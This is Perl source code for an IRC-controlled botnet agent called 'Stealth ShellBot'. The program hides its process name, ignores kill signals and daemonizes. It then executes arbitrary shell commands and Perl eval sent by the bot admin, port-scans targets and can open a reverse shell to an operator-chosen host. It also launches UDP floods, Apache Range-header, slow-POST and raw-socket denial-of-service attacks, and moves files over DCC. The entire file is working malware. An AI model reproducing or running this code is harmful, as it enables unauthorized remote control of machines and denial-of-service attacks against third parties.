$p = "";
for ($k=0;$k<1300;$k++) {
        $p .= ",5-$k";
}
my @ps = (" ");
my $processo = $ps[rand scalar @ps];
$servidor='' unless $servidor;
my $porta='443';
my @canais=("#allornothing");
my @adms=("Kelevra"); 
my $linas_max=10;
my $sleep=5;
my $nick = getnick();
my $ircname = "bends";
my $realname = `uname -vr`;
my $uname = `uname -a`;
my $acessoshell = 1;
######## Stealth ShellBot ##########
my $prefixo = "!x";
my $estatisticas = 0;
my $pacotes = 1;
my $VERSAO = '0.3b';
$SIG{'INT'} = 'IGNORE';
$SIG{'HUP'} = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'} = 'IGNORE';
use IO::Socket;
use Socket;
use IO::Select;
$servidor="$ARGV[0]" if $ARGV[0];
$0="$processo"."\0";
my $pid=fork;
exit if $pid;
die "Problema en PID: $!" unless defined($pid);

my %irc_servers;
my %DCC;
my $dcc_sel = new IO::Select->new();

#####################
# Stealth Shellbot  #
#####################

sub getnick {
  return "Rizee|PLK|00|".int(rand(8999)+1000);
}


$sel_cliente = IO::Select->new();
sub sendraw {
  if ($#_ == '1') {
    my $socket = $_[0];
    print $socket "$_[1]\n";
  } else {
      print $IRC_cur_socket "$_[0]\n";
  }
}

sub conectar {
   my $meunick = $_[0];
   my $servidor_con = $_[1];
   my $porta_con = $_[2];

   my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$servidor_con", PeerPort=>$porta_con) or return(1);
   if (defined($IRC_socket)) {
     $IRC_cur_socket = $IRC_socket;

     $IRC_socket->autoflush(1);
     $sel_cliente->add($IRC_socket);

     $irc_servers{$IRC_cur_socket}{'host'} = "$servidor_con";
     $irc_servers{$IRC_cur_socket}{'porta'} = "$porta_con";
     $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
     $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;
     nick("$meunick");
     sendraw("USER $ircname ".$IRC_socket->sockhost." $servidor_con :$realname");
     sleep 2;
   }

}
my $line_temp;
while( 1 ) {
   while (!(keys(%irc_servers))) { conectar("$nick", "$servidor", "$porta"); }
   delete($irc_servers{''}) if (defined($irc_servers{''}));
   &DCC::connections;
   my @ready = $sel_cliente->can_read(0.6);
   next unless(@ready);
   foreach $fh (@ready) {
     $IRC_cur_socket = $fh;
     $meunick = $irc_servers{$IRC_cur_socket}{'nick'};
     $nread = sysread($fh, $msg, 4096);
     if ($nread == 0) {
        $sel_cliente->remove($fh);
        $fh->close;
        delete($irc_servers{$fh});
     }
     @lines = split (/\n/, $msg);

     for(my $c=0; $c<= $#lines; $c++) {
       $line = $lines[$c];
       $line=$line_temp.$line if ($line_temp);
       $line_temp='';
       $line =~ s/\r$//;
       unless ($c == $#lines) {
         parse("$line");
       } else {
           if ($#lines == 0) {
             parse("$line");
           } elsif ($lines[$c] =~ /\r$/) {
               parse("$line");
           } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
               parse("$line");
           } else {
               $line_temp = $line;
           }
       }
      }
   }
}

sub parse {
   my $servarg = shift;
   if ($servarg =~ /^PING \:(.*)/) {
     sendraw("PONG :$1");
   } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
       my $pn=$1; my $onde = $4; my $args = $5;
       if ($args =~ /^\001VERSION\001$/) {
         notice("$pn", "");
       }
       elsif ($args =~ /^\001PING\s+(\d+)\001$/) {
         notice("$pn", "\001PONG\001");
       }
       elsif (grep {$_ =~ /^\Q$pn\E$/i } @adms) {
         if ($onde eq "$meunick"){
           shell("$pn", "$args");
         }
         elsif ($args =~ /^(\Q$meunick\E|\Q$prefixo\E)\s+(.*)/ ) {
            my $natrix = $1;
            my $arg = $2;
            if ($arg =~ /^\!(.*)/) {
              ircase("$pn","$onde","$1") unless ($natrix eq "$prefixo" and $arg =~ /^\!nick/);
            } elsif ($arg =~ /^\@(.*)/) {
                $ondep = $onde;
                $ondep = $pn if $onde eq $meunick;
                bfunc("$ondep","$1");
            } else {
                shell("$onde", "$arg");
            }
         }
       }
   } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
       if (lc($1) eq lc($meunick)) {
         $meunick=$4;
         $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
       }
   } elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
       $meunick = getnick();
       nick("$meunick");
   } elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
       $meunick = $2;
       $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
       $irc_servers{$IRC_cur_socket}{'nome'} = "$1";
       foreach my $canal (@canais) {
         sendraw("JOIN $canal");
        sendraw("PRIVMSG $canal $uname");

       }
   }
}

sub bfunc {
  my $printl = $_[0];
  my $funcarg = $_[1];
  if (my $pid = fork) {
     waitpid($pid, 0);
  } else {
      if (fork) {
         exit;
       } else {
           if ($funcarg =~ /^pscan (.*)/) {
             my $hostip="$1";
             my @portas=("21","22","23","25","53","59","79","80","110","113","135","139","53","445","1025","5000","6660","6661","6662","6663","6665","6666","6667","6668","6669","7000","8080","8018");
             my (@aberta, %porta_banner);
             foreach my $porta (@portas)  {
                my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto => 'tcp', Timeout => 4);
                if ($scansock) {
                   push (@aberta, $porta);
                   $scansock->close;
                }
             }
             if (@aberta) {
               sendraw($IRC_cur_socket, "PRIVMSG $printl :Puertos Abiertos: @aberta");
             } else {
                 sendraw($IRC_cur_socket,"PRIVMSG $printl :Ningï¿½n puerto fue encontrado.");
             }
           }

           elsif ($funcarg =~ /^portscan\s+(.*)\s+(\d+)\s+(\d+)/) {
             my $hostname="$1";
             my $portainicial = "$2";
             my $portafinal = "$3";
             my (@abertas, %porta_banner);
             foreach my $porta ($portainicial..$portafinal)
             {
               my $scansock = IO::Socket::INET->new(PeerAddr => $hostname, PeerPort => $porta, Proto => 'tcp', Timeout => 4);
               if ($scansock) {
                 push (@abertas, $porta);
                 $scansock->close;
                 sendraw($IRC_cur_socket, "PRIVMSG $printl :Puerco $porta abierto en $hostname");
               }
             }
             if (@abertas) {
               sendraw($IRC_cur_socket, "PRIVMSG $printl :Puertos abiertos: @abertas");
             } else {
               sendraw($IRC_cur_socket,"PRIVMSG $printl :No se encontrï¿½ ningun puerto abierto.");
             }
            }

            # Duas Vers?es simplificada do meu Tr0x ;D
            elsif ($funcarg =~ /^udp\s+(.*)\s+(\d+)\s+(\d+)/) {
              return unless $pacotes;
              socket(Tr0x, PF_INET, SOCK_DGRAM, 17);
              my $alvo=inet_aton("$1");
              my $porta = "$2";
              my $tempo = "$3";
          sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[UDP]\002: iniciado en $1: tiempo: $tempo");
              my $pacote;
              my $pacotese;
              my $fim = time + $tempo;
              my $pacota = 1;
              while (($pacota == "1")) {
                $pacota = 0 if ((time >= $fim) && ($tempo != "0"));
                $pacote=$rand x $rand x $rand;
                $porta = int(rand 65000) +1 if ($porta == "0");
                send(Tr0x, 0, $pacote, sockaddr_in($porta, $alvo)) and $pacotese++;
              }
               sendraw($IRC_cur_socket, "PRIVMSG $printl :[UDP] Terminado $1 tiempo: $tempo"."segs solicitudes: $pacotese");
            }

            elsif ($funcarg =~ /^arme\s+(.*)\s+(\d+)\s+(\d+)/) {
              return unless $pacotes;
              socket(Tr0x, PF_INET, SOCK_DGRAM, 17);
              my $alvo=inet_aton("$1");
              my $porta = "$2";
              my $tempo = "$3";
          sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[ARME]\002 Starting flood in: $1 Time: $tempo");
              my $pacote;
              my $pacotese;
              my $fim = time + $tempo;
              my $pacota = 1;
              while (($pacota == "1")) {
              $pacota = 0 if ((time >= $fim) && ($tempo != "0"));
$x = "";
my $sock = IO::Socket::INET->new(PeerAddr => "$1",
                                 PeerPort => "80",
                                         Proto    => 'tcp');
$puta = "HEAD / HTTP/1.1\r\nHost: $1\r\nRange:bytes=0-$p\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n";
print $sock $puta;
              }
               #sendraw($IRC_cur_socket, "PRIVMSG $printl :\002Tempo de Pacotes\002: $tempo"."s");
               #sendraw($IRC_cur_socket, "PRIVMSG $printl :\002Total de Pacotes\002: $pacotese");
               sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[ARME]\002 Finished in $1");
            }
            elsif ($funcarg =~ /^slowpost\s+(.*)\s+(\d+)\s+(\d+)/) {
              return unless $pacotes;
              socket(Tr0x, PF_INET, SOCK_DGRAM, 17);
              my $alvo=inet_aton("$1");
              my $porta = "$2";
              my $tempo = "$3";
          sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[SlowPost]\002 Starting flood in: $1 Time: $tempo");
              my $pacote;
              my $pacotese;
              my $fim = time + $tempo;
              my $pacota = 1;
              while (($pacota == "1")) {
              $pacota = 0 if ((time >= $fim) && ($tempo != "0"));
$x = "";
my $sock = IO::Socket::INET->new(PeerAddr => "$1",
                                 PeerPort => "80",
                                         Proto    => 'tcp');
$puta = "POST / HTTP/1.1\r\nHost: $1\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)\r\nConnection: keep-alive\r\nKeep-Alive: 900\r\nContent-Length: 10000\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n";
print $sock $puta;
              }
               sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[SlowPost]\002 Finished in $1");
            }
            elsif ($funcarg =~ /^backconnect\s+(.*)\s+(\d+)/) {
              my $host = "$1";
              my $porta = "$2";
              sendraw($IRC_cur_socket, "PRIVMSG $printl :\002Conectando a\002: $host:$porta");
              my $proto = getprotobyname('tcp');
              my $iaddr = inet_aton($host);
              my $paddr = sockaddr_in($porta, $iaddr);
              my $shell = "/bin/sh -i";
              if ($^O eq "MSWin32") {
                $shell = "cmd.exe";
              }
              socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";
              connect(SOCKET, $paddr) or die "connect: $!";
              open(STDIN, ">&SOCKET");
              open(STDOUT, ">&SOCKET");
              open(STDERR, ">&SOCKET");
              system("$shell");
              close(STDIN);
              close(STDOUT);
              close(STDERR);
            }
           elsif ($funcarg =~ /^info/) {
           my $sysos = `uname -sr`;
           my $uptime = `uptime`;
           if ( $sysos =~ /freebsd/i ) {
           $sysname = `hostname`;
           $memory = `expr \`cat /var/run/dmesg.boot | grep "real memory" | cut -f5 -d" "\` \/ 1048576`;
           $swap = `$toploc | grep -i swap | cut -f2 -d" " | cut -f1 -d"M"`;
           chomp($memory);
           chomp($swap);
           }
           elsif ( $sysos =~ /linux/i ) {
           $sysname = `hostname -f`;
           $memory = `free -m |grep -i mem | awk '{print \$2}'`;
           $swap = `free -m |grep -i swap | awk '{print \$2}'`;
           chomp($swap);
           chomp($memory);
           }
           else {
           $sysname ="Not Found";;
           $memory ="Not found";
           $swap ="Not Found";
           }
           sendraw($IRC_cur_socket, "PRIVMSG $printl : �15--- �3[�01 SysInfo �3] �15-------------");
           sendraw($IRC_cur_socket, "PRIVMSG $printl : �01os/host�15�;��01 $sysos - $sysname ");
           sendraw($IRC_cur_socket, "PRIVMSG $printl : �01proc/PID�15�;��01 $processo - $$");
           sendraw($IRC_cur_socket, "PRIVMSG $printl : �01uptime�15�;��01 $uptime");
           sendraw($IRC_cur_socket, "PRIVMSG $printl : �01memory/swap�15�;��01 $memory - $swap");
           sendraw($IRC_cur_socket, "PRIVMSG $printl : �01perl/bot�15�;��01 $] - $VERSAO");
           sendraw($IRC_cur_socket, "PRIVMSG $printl : �15--- �3[�01 /SysInfo �3] �15------------");
           }
           exit;
    }
  }
}

sub ircase {
  my ($kem, $printl, $case) = @_;

   if ($case =~ /^join (.*)/) {
     j("$1");
   }
   elsif ($case =~ /^part (.*)/) {
      p("$1");
   }
   elsif ($case =~ /^rejoin\s+(.*)/) {
      my $chan = $1;
      if ($chan =~ /^(\d+) (.*)/) {
        for (my $ca = 1; $ca <= $1; $ca++ ) {
          p("$2");
          j("$2");
        }
      } else {
          p("$chan");
          j("$chan");
      }
   }
   elsif ($case =~ /^op/) {
      op("$printl", "$kem") if $case eq "op";
      my $oarg = substr($case, 3);
      op("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }
   elsif ($case =~ /^deop/) {
      deop("$printl", "$kem") if $case eq "deop";
      my $oarg = substr($case, 5);
      deop("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }
   elsif ($case =~ /^voice/) {
      voice("$printl", "$kem") if $case eq "voice";
      $oarg = substr($case, 6);
      voice("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }
   elsif ($case =~ /^devoice/) {
      devoice("$printl", "$kem") if $case eq "devoice";
      $oarg = substr($case, 8);
      devoice("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }
   elsif ($case =~ /^msg\s+(\S+) (.*)/) {
      msg("$1", "$2");
   }
   elsif ($case =~ /^flood\s+(\d+)\s+(\S+) (.*)/) {
      for (my $cf = 1; $cf <= $1; $cf++) {
        msg("$2", "$3");
      }
   }
   elsif ($case =~ /^ctcpflood\s+(\d+)\s+(\S+) (.*)/) {
      for (my $cf = 1; $cf <= $1; $cf++) {
        ctcp("$2", "$3");
      }
   }
   elsif ($case =~ /^ctcp\s+(\S+) (.*)/) {
      ctcp("$1", "$2");
   }
   elsif ($case =~ /^invite\s+(\S+) (.*)/) {
      invite("$1", "$2");
   }
   elsif ($case =~ /^nick (.*)/) {
      nick("$1");
   }
   elsif ($case =~ /^conecta\s+(\S+)\s+(\S+)/) {
       conectar("$2", "$1", 6667);
   }
   elsif ($case =~ /^send\s+(\S+)\s+(\S+)/) {
      DCC::SEND("$1", "$2");
   }
   elsif ($case =~ /^raw (.*)/) {
      sendraw("$1");
   }
   elsif ($case =~ /^eval (.*)/) {
      eval "$1";
   }
   elsif ($case =~ /^entra\s+(\S+)\s+(\d+)/) {
    sleep int(rand($2));
    j("$1");
   }
   elsif ($case =~ /^sai\s+(\S+)\s+(\d+)/) {
    sleep int(rand($2));
    p("$1");
   }
   elsif ($case =~ /^sair/) {
     quit();
   }
   elsif ($case =~ /^novonick/) {
    my $novonick = getnick();
     nick("$novonick");
   }
   elsif ($case =~ /^estatisticas (.*)/) {
     if ($1 eq "on") {
      $estatisticas = 1;
      msg("$printl", "Estat?sticas ativadas!");
     } elsif ($1 eq "off") {
      $estatisticas = 0;
      msg("$printl", "Estat?sticas desativadas!");
     }
   }
   elsif ($case =~ /^pacotes (.*)/) {
     if ($1 eq "on") {
      $pacotes = 1;
      msg("$printl", "Pacotes ativados!") if ($estatisticas == "1");
     } elsif ($1 eq "off") {
      $pacotes = 0;
      msg("$printl", "Pacotes desativados!") if ($estatisticas == "1");
     }
   }
}
sub shell {
  return unless $acessoshell;
  my $printl=$_[0];
  my $comando=$_[1];
  if ($comando =~ /cd (.*)/) {
    chdir("$1") || msg("$printl", "Diret?rio inexistente!");
    return;
  }
  elsif ($pid = fork) {
     waitpid($pid, 0);
  } else {
      if (fork) {
         exit;
       } else {
           my @resp=`$comando 2>&1 3>&1`;
           my $c=0;
           foreach my $linha (@resp) {
             $c++;
             chop $linha;
             sendraw($IRC_cur_socket, "PRIVMSG $printl :$linha");
             if ($c >= "$linas_max") {
               $c=0;
               sleep $sleep;
             }
           }
           exit;
       }
  }
}
sub attacker {
  my $iaddr = inet_aton($_[0]);
  my $msg = 'B' x $_[1];
  my $ftime = $_[2];
  my $cp = 0;
  my (%pacotes);
  $pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;

  socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;
  socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;
  socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;
  socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;
  return(undef) if $cp == 4;
  my $itime = time;
  my ($cur_time);
  while ( 1 ) {
     for (my $porta = 1; $porta <= 65535; $porta++) {
       $cur_time = time - $itime;
       last if $cur_time >= $ftime;
       send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++ if ($pacotes == 1);
       send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++ if ($pacotes == 1);
       send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++ if ($pacotes == 1);
       send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++ if ($pacotes == 1);

       # DoS ?? :P
       for (my $pc = 3; $pc <= 255;$pc++) {
         next if $pc == 6;
         $cur_time = time - $itime;
         last if $cur_time >= $ftime;
         socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;
         send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++ if ($pacotes == 1);
       }
     }
     last if $cur_time >= $ftime;
  }
  return($cur_time, %pacotes);
}

#############
#  ALIASES  #
#############

sub action {
   return unless $#_ == 1;
   sendraw("PRIVMSG $_[0] :\001ACTION $_[1]\001");
}

sub ctcp {
   return unless $#_ == 1;
   sendraw("PRIVMSG $_[0] :\001$_[1]\001");
}
sub msg {
   return unless $#_ == 1;
   sendraw("PRIVMSG $_[0] :$_[1]");
}

sub notice {
   return unless $#_ == 1;
   sendraw("NOTICE $_[0] :$_[1]");
}

sub op {
   return unless $#_ == 1;
   sendraw("MODE $_[0] +o $_[1]");
}
sub deop {
   return unless $#_ == 1;
   sendraw("MODE $_[0] -o $_[1]");
}
sub hop {
    return unless $#_ == 1;
   sendraw("MODE $_[0] +h $_[1]");
}
sub dehop {
   return unless $#_ == 1;
   sendraw("MODE $_[0] +h $_[1]");
}
sub voice {
   return unless $#_ == 1;
   sendraw("MODE $_[0] +v $_[1]");
}
sub devoice {
   return unless $#_ == 1;
   sendraw("MODE $_[0] -v $_[1]");
}
sub ban {
   return unless $#_ == 1;
   sendraw("MODE $_[0] +b $_[1]");
}
sub unban {
   return unless $#_ == 1;
   sendraw("MODE $_[0] -b $_[1]");
}
sub kick {
   return unless $#_ == 1;
   sendraw("KICK $_[0] $_[1] :$_[2]");
}

sub modo {
   return unless $#_ == 0;
   sendraw("MODE $_[0] $_[1]");
}
sub mode { modo(@_); }

sub j { &join(@_); }
sub join {
   return unless $#_ == 0;
   sendraw("JOIN $_[0]");
}
sub p { part(@_); }
sub part {sendraw("PART $_[0]");}

sub nick {
  return unless $#_ == 0;
  sendraw("NICK $_[0]");
}

sub invite {
   return unless $#_ == 1;
   sendraw("INVITE $_[1] $_[0]");
}
sub topico {
   return unless $#_ == 1;
   sendraw("TOPIC $_[0] $_[1]");
}
sub topic { topico(@_); }

sub whois {
  sendraw("WHOIS $_[0]");
}
sub who {
  return unless $#_ == 0;
  sendraw("WHO $_[0]");
}
sub names {
  return unless $#_ == 0;
  sendraw("NAMES $_[0]");
}
sub away {
  sendraw("AWAY $_[0]");
}
sub back { away(); }
sub quit {
  sendraw("QUIT :$_[0]");
  exit;
}

# DCC
package DCC;

sub connections {
   my @ready = $dcc_sel->can_read(1);
#   return unless (@ready);
   foreach my $fh (@ready) {
     my $dcctipo = $DCC{$fh}{tipo};
     my $arquivo = $DCC{$fh}{arquivo};
     my $bytes = $DCC{$fh}{bytes};
     my $cur_byte = $DCC{$fh}{curbyte};
     my $nick = $DCC{$fh}{nick};

     my $msg;
     my $nread = sysread($fh, $msg, 10240);

     if ($nread == 0 and $dcctipo =~ /^(get|sendcon)$/) {
        $DCC{$fh}{status} = "Cancelado";
        $DCC{$fh}{ftime} = time;
        $dcc_sel->remove($fh);
        $fh->close;
        next;
     }

     if ($dcctipo eq "get") {
        $DCC{$fh}{curbyte} += length($msg);

        my $cur_byte = $DCC{$fh}{curbyte};

        open(FILE, ">> $arquivo");
        print FILE "$msg" if ($cur_byte <= $bytes);
        close(FILE);

        my $packbyte = pack("N", $cur_byte);
        print $fh "$packbyte";

        if ($bytes == $cur_byte) {
           $dcc_sel->remove($fh);
           $fh->close;
           $DCC{$fh}{status} = "Recebido";
           $DCC{$fh}{ftime} = time;
           next;
        }
     } elsif ($dcctipo eq "send") {
          my $send = $fh->accept;
          $send->autoflush(1);
          $dcc_sel->add($send);
          $dcc_sel->remove($fh);
          $DCC{$send}{tipo} = 'sendcon';
          $DCC{$send}{itime} = time;
          $DCC{$send}{nick} = $nick;
          $DCC{$send}{bytes} = $bytes;
          $DCC{$send}{curbyte} = 0;
          $DCC{$send}{arquivo} = $arquivo;
          $DCC{$send}{ip} = $send->peerhost;
          $DCC{$send}{porta} = $send->peerport;
          $DCC{$send}{status} = "Enviando";

          #de cara manda os primeiro 1024 bytes do arkivo.. o resto fik com o sendcon
          open(FILE, "< $arquivo");
          my $fbytes;
          read(FILE, $fbytes, 1024);
          print $send "$fbytes";
          close FILE;
#          delete($DCC{$fh});
     } elsif ($dcctipo eq 'sendcon') {
          my $bytes_sended = unpack("N", $msg);
          $DCC{$fh}{curbyte} = $bytes_sended;
          if ($bytes_sended == $bytes) {
             $fh->close;
             $dcc_sel->remove($fh);
             $DCC{$fh}{status} = "Enviado";
             $DCC{$fh}{ftime} = time;
             next;
          }
          open(SENDFILE, "< $arquivo");
          seek(SENDFILE, $bytes_sended, 0);
          my $send_bytes;
          read(SENDFILE, $send_bytes, 1024);
          print $fh "$send_bytes";
          close(SENDFILE);
     }
   }
}


sub SEND {
  my ($nick, $arquivo) = @_;
  unless (-r "$arquivo") {
    return(0);
  }

  my $dccark = $arquivo;
  $dccark =~ s/[.*\/](\S+)/$1/;

  my $meuip = $::irc_servers{"$::IRC_cur_socket"}{'meuip'};
  my $longip = unpack("N",inet_aton($meuip));

  my @filestat = stat($arquivo);
  my $size_total=$filestat[7];
  if ($size_total == 0) {
     return(0);
  }

  my ($porta, $sendsock);
  do {
    $porta = int rand(64511);
    $porta += 1024;
    $sendsock = IO::Socket::INET->new(Listen=>1, LocalPort =>$porta, Proto => 'tcp') and $dcc_sel->add($sendsock);
  } until $sendsock;

  $DCC{$sendsock}{tipo} = 'send';
  $DCC{$sendsock}{nick} = $nick;
  $DCC{$sendsock}{bytes} = $size_total;
  $DCC{$sendsock}{arquivo} = $arquivo;


  &::ctcp("$nick", "DCC SEND $dccark $longip $porta $size_total");

}

sub GET {
  my ($arquivo, $dcclongip, $dccporta, $bytes, $nick) = @_;
  return(0) if (-e "$arquivo");
  if (open(FILE, "> $arquivo")) {
     close FILE;
  } else {
    return(0);
  }

  my $dccip=fixaddr($dcclongip);
  return(0) if ($dccporta < 1024 or not defined $dccip or $bytes < 1);
  my $dccsock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>$dccip, PeerPort=>$dccporta, Timeout=>15) or return (0);
  $dccsock->autoflush(1);
  $dcc_sel->add($dccsock);
  $DCC{$dccsock}{tipo} = 'get';
  $DCC{$dccsock}{itime} = time;
  $DCC{$dccsock}{nick} = $nick;
  $DCC{$dccsock}{bytes} = $bytes;
  $DCC{$dccsock}{curbyte} = 0;
  $DCC{$dccsock}{arquivo} = $arquivo;
  $DCC{$dccsock}{ip} = $dccip;
  $DCC{$dccsock}{porta} = $dccporta;
  $DCC{$dccsock}{status} = "Recebendo";
}

# po fico xato de organiza o status.. dai fiz ele retorna o status de acordo com o socket.. dai o ADM.pl lista os sockets e faz as perguntas
sub Status {
  my $socket = shift;
  my $sock_tipo = $DCC{$socket}{tipo};
  unless (lc($sock_tipo) eq "chat") {
    my $nick = $DCC{$socket}{nick};
    my $arquivo = $DCC{$socket}{arquivo};
    my $itime = $DCC{$socket}{itime};
    my $ftime = time;
    my $status = $DCC{$socket}{status};
    $ftime = $DCC{$socket}{ftime} if defined($DCC{$socket}{ftime});

    my $d_time = $ftime-$itime;

    my $cur_byte = $DCC{$socket}{curbyte};
    my $bytes_total =  $DCC{$socket}{bytes};

    my $rate = 0;
    $rate = ($cur_byte/1024)/$d_time if $cur_byte > 0;
    my $porcen = ($cur_byte*100)/$bytes_total;

    my ($r_duv, $p_duv);
    if ($rate =~ /^(\d+)\.(\d)(\d)(\d)/) {
       $r_duv = $3; $r_duv++ if $4 >= 5;
       $rate = "$1\.$2"."$r_duv";
    }
    if ($porcen =~ /^(\d+)\.(\d)(\d)(\d)/) {
       $p_duv = $3; $p_duv++ if $4 >= 5;
       $porcen = "$1\.$2"."$p_duv";
    }
    return("$sock_tipo","$status","$nick","$arquivo","$bytes_total", "$cur_byte","$d_time", "$rate", "$porcen");
  }


  return(0);
}


# esse 'sub fixaddr' daki foi pego do NET::IRC::DCC identico soh copiei e coloei (colokar nome do autor)
sub fixaddr {
    my ($address) = @_;

    chomp $address;     # just in case, sigh.
    if ($address =~ /^\d+$/) {
        return inet_ntoa(pack "N", $address);
    } elsif ($address =~ /^[12]?\d{1,2}\.[12]?\d{1,2}\.[12]?\d{1,2}\.[12]?\d{1,2}$/) {
        return $address;
    } elsif ($address =~ tr/a-zA-Z//) {                    # Whee! Obfuscation!
        return inet_ntoa(((gethostbyname($address))[4])[0]);
    } else {
        return;
    }
}
